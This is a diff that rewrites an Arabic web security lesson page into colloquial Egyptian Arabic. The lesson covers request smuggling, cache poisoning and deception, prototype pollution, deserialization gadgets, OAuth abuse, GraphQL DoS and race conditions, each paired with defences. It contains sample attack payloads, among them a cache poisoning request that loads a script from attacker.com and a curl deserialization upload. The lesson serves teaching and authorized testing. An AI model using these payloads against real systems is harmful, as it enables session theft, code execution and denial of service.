@@ -7,15 +7,15 @@ export default function Page() {
       <L
         ar={<>
           <Section title="الويب على مستوى الخبراء">
-            <Analogy>OWASP Top 10 هو الأبجدية. الدرس هذا هو القواعد و الأدب. هنا نتعامل مع ثغرات فيها أكثر من «حقن قيمة»: نلاعب على المستوى البروتوكولي و المعماري حيث يفترض المطورون أن «الـ stack يحمي نفسه».</Analogy>
-            <Callout kind="danger" title="استخدام مصرّح فقط">
-              كل التقنيات هنا ضمن نطاق اختبارات اختراق رسمية (red team / bug bounty). تطبيقها على هدف بدون
-              تفويض = جريمة فيدرالية.
+            <Analogy>OWASP Top 10 هو الأبجدية. الدرس ده الأدب والشعر. هنا مش بنحقن قيمة في فورم، إحنا بنلعب على مستوى البروتوكول والمعمارية، في الأماكن اللي المطور بيفترض إن "الـ stack بيحمي نفسه".</Analogy>
+            <Callout kind="danger" title="إذن رسمي فقط">
+              كل التكنيكات هنا ضمن اختبارات اختراق رسمية (red team / bug bounty). تطبيقها على هدف من غير
+              تفويض = جريمة فيدرالية. خلي بالك.
             </Callout>
           </Section>
 
-          <Section title="HTTP Request Smuggling — الخلاف بين الـ frontend و backend">
-            <Analogy>تخيّل أن هناك حارسَين يقفان بينك و بين البنك: حارس عند البوابة (frontend/proxy) و حارس داخل الردهة (backend). كل واحد يحسب «الزائرين» بطريقة مختلفة. لو أرسلتَ شخصين ملتصقين، سيرى الأول واحداً فقط، فيدخل الاثنان معاً. هذا الـ Request Smuggling.</Analogy>
+          <Section title="HTTP Request Smuggling — لما الـ frontend والـ backend يختلفوا">
+            <Analogy>تخيل فيه حارسين بينك وبين البنك: واحد عند البوابة (frontend/proxy) وواحد جوه الصالة (backend). كل واحد بيعد الزوار بطريقة مختلفة. لو بعتّ اتنين ملصوقين، الأول هيشوفهم واحد، والاتنين هيدخلوا. ده بالظبط الـ Request Smuggling.</Analogy>
             <h3>أنواع الـ desync</h3>
             <ul>
               <li><b>CL.TE</b> — الـ frontend يستخدم Content-Length، الـ backend يستخدم Transfer-Encoding.</li>
@@ -32,16 +32,16 @@ Transfer-Encoding: chunked
 0
 
 SMUGGLED`}</Code>
-            <p>الـ frontend يقرأ كامل الـ 13 بايت كرسالة واحدة. الـ backend يرى chunked → 0 = نهاية، فيعتبر <code>SMUGGLED</code> بداية رسالة <i>التالية</i> من ضحية حقيقية.</p>
-            <h3>التأثير</h3>
+            <p>الـ frontend بيقرا الـ 13 بايت كرسالة واحدة. الـ backend بيشوف chunked → 0 = خلاص نهاية، وبيعتبر <code>SMUGGLED</code> أول الرسالة <i>اللي بعدها</i> من ضحية حقيقية. مين هي الضحية؟ أي حد جاي وراك في نفس الـ connection.</p>
+            <h3>هتعمل بيها إيه؟</h3>
             <ul>
-              <li>سرقة الـ session cookies للمستخدمين القادمين.</li>
-              <li>تسميم الـ cache.</li>
-              <li>تجاوز الـ access controls على الـ frontend.</li>
-              <li>تنفيذ XSS على ضحايا آخرين.</li>
-              <li>سرقة كل الـ headers بما فيها الـ Authorization.</li>
+              <li>تسرق session cookies لليوزرز اللي جايين بعدك.</li>
+              <li>تسمم الـ cache.</li>
+              <li>تتخطى access controls اللي على الـ frontend.</li>
+              <li>تحقن XSS على ضحايا تانيين.</li>
+              <li>تسرق كل الـ headers بما فيهم الـ Authorization.</li>
             </ul>
-            <h3>الكشف و الأدوات</h3>
+            <h3>الكشف والأدوات</h3>
             <ul>
               <li><b>HTTP Request Smuggler</b> (Burp extension by Albinowax).</li>
               <li><b>smuggler.py</b> (defparam).</li>
@@ -50,16 +50,16 @@ SMUGGLED`}</Code>
             </ul>
             <Callout kind="good" title="الدفاع">
               <ol>
-                <li>HTTP/2 end-to-end (لا downgrade للـ backend).</li>
-                <li>رفض الطلبات التي تحوي Content-Length و Transfer-Encoding معاً.</li>
-                <li>front-end و back-end من نفس البائع و نفس الإصدار.</li>
+                <li>HTTP/2 من الأول للآخر (مفيش downgrade للـ backend).</li>
+                <li>ارفض أي request جاي بـ Content-Length و Transfer-Encoding مع بعض.</li>
+                <li>الـ frontend والـ backend من نفس الـ vendor ونفس الإصدار.</li>
                 <li>استخدم <b>haproxy/nginx h2-mode strict</b>.</li>
-                <li>راقب طلبات بحجم body مختلف عن الـ Content-Length في الـ logs.</li>
+                <li>راقب الـ logs على حجم body مختلف عن الـ Content-Length.</li>
               </ol>
             </Callout>
           </Section>
 
-          <Section title="HTTP/2 و gRPC — أسطح هجوم جديدة">
+          <Section title="HTTP/2 و gRPC — سطح هجوم جديد بالكامل">
             <ul>
               <li><b>Rapid Reset (CVE-2023-44487)</b> — DoS عبر فتح streams و إغلاقها فوراً.</li>
               <li><b>HPACK bombs</b> — header compression للضغط على الـ memory.</li>
@@ -69,7 +69,7 @@ SMUGGLED`}</Code>
           </Section>
 
           <Section title="Server-Side Cache Poisoning">
-            <Analogy>الـ CDN/cache هو موظف مكتبة يحفظ نسخة من كل كتاب يُطلب. لو خدعتَه بأن يحفظ «كتاباً مزيفاً» تحت اسم كتاب شرعي، كل من يطلبه لاحقاً سيحصل على المزيف.</Analogy>
+            <Analogy>الـ CDN/cache زي أمين مكتبة بيحفظ نسخة من كل كتاب اتطلب. لو لعبتها صح وخليته يحفظ "كتاب مزيف" تحت اسم كتاب أصلي، كل اللي هيطلبه بعد كدة هيلاقي المزيف. الفرق بينك وبينه إنك لعبت في "اسم الكتاب" مش في الكتاب نفسه.</Analogy>
             <Code lang="payload">{`# 1) ابحث عن header غير مدرج في الـ cache key
 GET / HTTP/1.1
 Host: target.gov
@@ -79,15 +79,15 @@ X-Forwarded-Host: attacker.com
 <script src="//attacker.com/main.js">
 
 # 3) الـ cache يحفظ النتيجة. كل زائر تالٍ يحمّل JS من المهاجم.`}</Code>
-            <p>أداة: <b>Param Miner</b> (Burp) لاكتشاف الـ unkeyed inputs.</p>
+            <p>الأداة: <b>Param Miner</b> (Burp) عشان تكتشف الـ unkeyed inputs.</p>
             <Callout kind="good" title="الدفاع">
-              لا تعكس headers غير موثوقة. أضِف كل header مؤثّر إلى الـ <code>Vary</code> أو الـ cache key. استخدم
-              <b> normalization</b> صارم في الـ CDN.
+              متعكسش headers مش موثوقة في الرد. ضيف كل header مؤثر للـ <code>Vary</code> أو للـ cache key. وطبّق
+              <b> normalization</b> صارم على مستوى الـ CDN.
             </Callout>
           </Section>
 
-          <Section title="Web Cache Deception">
-            <p>المعكوس للـ Cache Poisoning: تخدع الـ cache ليحفظ صفحة <b>خاصة</b> بمستخدم على أنها static.</p>
+          <Section title="Web Cache Deception — المرايا">
+            <p>عكس الـ Cache Poisoning بالظبط: هنا إنت بتخدع الـ cache يحفظ صفحة <b>خاصة</b> بيوزر معين كأنها static.</p>
             <Code lang="payload">{`# المستخدم لديه /account => يُرجع بياناته الشخصية
 # المهاجم يرسل له رابط:
 https://target.gov/account/photo.css
@@ -97,7 +97,7 @@ https://target.gov/account/photo.css
           </Section>
 
           <Section title="Prototype Pollution — JavaScript">
-            <p>في JavaScript، كل object يرث من <code>Object.prototype</code>. تلويث هذا الـ prototype = تأثير على كل objects التطبيق.</p>
+            <p>في JavaScript، كل object بيورث من <code>Object.prototype</code>. لو لوّثت الـ prototype ده، إنت لوّثت كل object في التطبيق دفعة واحدة.</p>
             <Code lang="JavaScript — vulnerable merge">{`// كود hashmap بسيط
 function merge(target, source) {
   for (let k in source) {
@@ -110,21 +110,21 @@ function merge(target, source) {
 { "__proto__": { "isAdmin": true } }
 
 // الآن: ({}).isAdmin === true لكل object في التطبيق!`}</Code>
-            <p>Gadget chains معروفة على Express, Lodash, jQuery تتحول من PP إلى RCE.</p>
-            <p>أدوات: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
+            <p>فيه Gadget chains معروفة على Express وLodash وjQuery بتحول الـ PP لـ RCE كامل.</p>
+            <p>الأدوات: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
             <Callout kind="good" title="الدفاع">
               <ul>
-                <li>استخدم <b>Map</b> و <b>Object.create(null)</b> بدلاً من plain objects.</li>
-                <li><b>Object.freeze(Object.prototype)</b> في الـ entrypoint.</li>
-                <li>Node.js: شغّل بـ <code>--disable-proto=delete</code>.</li>
+                <li>استخدم <b>Map</b> و <b>Object.create(null)</b> بدل الـ plain objects.</li>
+                <li>اعمل <b>Object.freeze(Object.prototype)</b> في الـ entrypoint.</li>
+                <li>في Node.js: شغّل بـ <code>--disable-proto=delete</code>.</li>
                 <li>Lint بـ <b>eslint-plugin-security</b> + <b>semgrep</b>.</li>
               </ul>
             </Callout>
           </Section>
 
           <Section title="Insecure Deserialization — سلاسل الـ Gadgets">
-            <p>الـ deserialization gadget chain هي تركيبة كائنات (موجودة بالفعل في الـ classpath) إذا فُكّ تشفيرها بترتيب معين تنفّذ كوداً.</p>
-            <h3>أمثلة شهيرة</h3>
+            <p>الـ gadget chain هو ترتيب لكلاسات موجودة فعلاً في الـ classpath، لو فككت الـ deserialization بترتيب معين، الكلاسات نفسها بتنفذ كود من غير ما إنت تكتب سطر. إنت بتستخدم سلاحه عليه.</p>
+            <h3>الأشهر في الميدان</h3>
             <TwoCol>
               <Card title="Java" color="red">
                 ysoserial — CommonsCollections1, Spring, Groovy, Hibernate.
@@ -149,69 +149,69 @@ curl -X POST https://target/api/import \\
   --data-binary @payload.bin`}</Code>
             <Callout kind="good" title="الدفاع">
               <ul>
-                <li>تحاشَ deserialization على بيانات خارجية أصلاً.</li>
-                <li>إن لزم: استخدم whitelist صارم للـ classes (LookAheadObjectInputStream).</li>
-                <li>الترقيع المستمر: Java SerialFilter، Microsoft AppDomainSwitches.</li>
-                <li>JSON Schema / Protobuf بدلاً من native serialization.</li>
-                <li>وقّع الـ payloads (HMAC) إن كان لا بد منها بين خدماتك الداخلية فقط.</li>
+                <li>متعملش deserialization على داتا جاية من بره أصلاً. ده الحل الصح.</li>
+                <li>لو مضطر: whitelist صارم للـ classes (LookAheadObjectInputStream).</li>
+                <li>خليك مرقع: Java SerialFilter، Microsoft AppDomainSwitches.</li>
+                <li>استخدم JSON Schema / Protobuf بدل الـ native serialization.</li>
+                <li>لو لازم تستخدمها بين خدماتك الداخلية بس، وقّع الـ payloads بـ HMAC.</li>
               </ul>
             </Callout>
           </Section>
 
-          <Section title="OAuth & SSO Abuse — هجمات القفل الذهبي">
+          <Section title="OAuth & SSO — هجمات القفل الذهبي">
             <ul>
-              <li><b>Account takeover via dangling redirect_uri</b> — تسجيل subdomain منتهي ثم استخدامه redirect.</li>
+              <li><b>Account takeover via dangling redirect_uri</b> — تسجل subdomain منتهية وتستخدمها redirect.</li>
               <li><b>OAuth covert redirect</b> — redirect_uri فيه open redirect.</li>
-              <li><b>SAML XSW (Signature Wrapping)</b> — التلاعب في الـ XML بحيث يتحقق التوقيع لجزء و يُقرأ جزء آخر.</li>
-              <li><b>JWT confused deputy</b> — توكن من مصدر آخر يُقبل بسبب عدم فحص <code>iss</code>.</li>
-              <li><b>Cross-tenant takeover</b> في الـ SaaS متعدد الـ tenants عبر misconfigured trust.</li>
+              <li><b>SAML XSW (Signature Wrapping)</b> — تلعب في الـ XML بحيث التوقيع يتحقق على جزء، ويتقرا جزء تاني خالص.</li>
+              <li><b>JWT confused deputy</b> — توكن جاي من issuer تاني بيتقبل لأن محدش بيفحص الـ <code>iss</code>.</li>
+              <li><b>Cross-tenant takeover</b> في SaaS متعدد الـ tenants عن طريق trust بايظ.</li>
             </ul>
           </Section>
 
-          <Section title="GraphQL هجمات أعمق">
+          <Section title="GraphQL — هجمات أعمق">
             <Code lang="GraphQL DoS — alias-based">{`{
   a1: user(id:1) { posts { comments { author { posts { comments { ... } } } } } }
   a2: user(id:2) { ... }
   ... 1000 aliases
 }`}</Code>
             <ul>
-              <li><b>Field suggestions</b> ينكشف schema حتى لو introspection معطل.</li>
-              <li><b>Mutation race conditions</b>: alias متعدد لاستهلاك نقاط reward قبل التحقق.</li>
-              <li>Authentication ضعيف على بعض الـ resolvers بسبب نسيان فحوصات.</li>
+              <li><b>Field suggestions</b> بيكشف الـ schema حتى لو الـ introspection مقفول.</li>
+              <li><b>Mutation race conditions</b>: aliases كتير عشان تستهلك نقاط reward قبل ما يتفحصوا.</li>
+              <li>auth ضعيف على resolvers معينة لأن حد نسي يحط الفحص.</li>
             </ul>
             <Callout kind="good" title="الدفاع">
-              query depth limit + cost analysis + rate limit per IP/user + <b>persisted queries</b> فقط.
+              query depth limit + cost analysis + rate limit per IP/user + <b>persisted queries</b> بس مفيش غيرها.
             </Callout>
           </Section>
 
-          <Section title="Race Conditions — ثواني تكلف الملايين">
-            <Analogy>تخيّل ATM فيه عيب: لو ضغطتَ زر السحب مرتين بسرعة فائقة قبل أن يحدّث الرصيد، يعطيك المبلغ مرتين. هذه حالة سباق (TOCTOU) — وقت الفحص ≠ وقت الاستخدام.</Analogy>
+          <Section title="Race Conditions — ثواني بتكلف ملايين">
+            <Analogy>تخيل ATM فيه عيب: تضغط Withdraw مرتين بسرعة قبل ما الرصيد يتحدث، يطلع لك المبلغ مرتين. ده race condition / TOCTOU — وقت الفحص مش هو وقت الاستخدام.</Analogy>
             <Code lang="exploit">{`# 50 طلب متزامن لاستخدام كوبون تخفيض مرة واحدة
 turbo-intruder + race-single-packet attack
 # أو
 GO + curl --parallel
 ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
             <ul>
-              <li>أداة <b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) ترسل عشرات الطلبات في حزمة TCP واحدة.</li>
-              <li>تأثيرات: تكرار سحب رصيد، تجاوز email verification، تسجيل اسم مستخدم محجوز.</li>
+              <li><b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) بيبعت عشرات الـ requests في TCP packet واحدة.</li>
+              <li>التأثير: سحب رصيد متكرر، تخطي email verification، حجز اسم يوزر محجوز لحد تاني.</li>
             </ul>
             <Callout kind="good" title="الدفاع">
               <ol>
                 <li><b>Database-level locks</b> (<code>SELECT ... FOR UPDATE</code>).</li>
-                <li>Idempotency keys على كل operation حساسة.</li>
+                <li>Idempotency keys على كل عملية حساسة.</li>
                 <li>Atomic decrement (<code>UPDATE ... SET stock = stock - 1 WHERE stock &gt; 0</code>).</li>
-                <li>Distributed locks (Redis, Zookeeper) عند الحاجة.</li>
+                <li>Distributed locks (Redis, Zookeeper) لما تحتاج.</li>
               </ol>
             </Callout>
           </Section>
 
-          <Section title="منهجية اصطياد الثغرات الحقيقية">
+          <Section title="إزاي تصطاد ثغرات حقيقية؟">
             <ol>
-              <li><b>اقرأ الكود إن أمكن</b>: source review &gt;&gt; black-box.</li>
-              <li><b>اخرج عن الـ checklist</b>: OWASP خطوة، الإبداع خطوات.</li>
-              <li><b>افهم business logic</b>: أكثر الثغرات قيمة هنا، لا في الـ payload.</li>
-              <li><b>اربط الثغرات</b>: SSRF صغير + open redirect + IDOR = اختراق كامل.</li>
-              <li><b>وثّق proof-of-impact</b> واضحاً للـ blue team.</li>
+              <li><b>اقرا الكود لو قادر</b>: source review &gt;&gt; black-box. مفيش مقارنة.</li>
+              <li><b>اطلع بره الـ checklist</b>: OWASP خطوة واحدة، الإبداع باقي السكة.</li>
+              <li><b>افهم الـ business logic</b>: أغلى الثغرات بتختبي هنا، مش في الـ payload.</li>
+              <li><b>وصّل الثغرات ببعض</b>: SSRF صغير + open redirect + IDOR = اختراق كامل.</li>
+              <li><b>وثّق proof-of-impact</b> بشكل واضح للـ blue team.</li>
             </ol>
           </Section>
         </>}
